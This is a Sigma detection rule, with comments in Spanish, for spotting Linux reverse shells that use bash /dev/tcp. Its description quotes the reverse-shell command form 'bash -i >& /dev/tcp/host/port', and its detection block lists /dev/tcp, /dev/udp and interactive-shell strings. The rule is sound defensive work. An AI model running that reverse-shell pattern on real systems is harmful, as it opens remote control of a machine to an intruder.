title: Shell inversa (bash /dev/tcp)
id: 4a71dfc8-7e6a-5a63-8946-c8a844833cbe
status: experimental
description: 'Patron de reverse shell: bash -i >& /dev/tcp/host/port.'
references:
- https://attack.mitre.org/techniques/T1059/004/
author: C. Villalba
date: 2026/07/16
tags:
- attack.execution
- attack.t1059.004
- iso27001-2022.a-8-7
- nist.cm-7
- nist.si-3
logsource:
  category: process_creation
  product: linux
detection:
  selection_dev:
    CommandLine|contains:
    - /dev/tcp/
    - /dev/udp/
  # "sh -i" a secas casaba con "ssh -i clave.pem" (cualquier administrador
  # conectandose por SSH). La shell tiene que ir precedida de inicio, espacio,
  # barra o separador de comandos.
  selection_shell_interactiva:
  - CommandLine|startswith:
    - sh -i
    - bash -i
  - CommandLine|contains:
    - ' sh -i'
    - /sh -i
    - ;sh -i
    - '|sh -i'
    - ' bash -i'
    - /bash -i
    - ;bash -i
    - '|bash -i'
  condition: 1 of selection_*
falsepositives:
- Diagnostico de red muy puntual
level: high
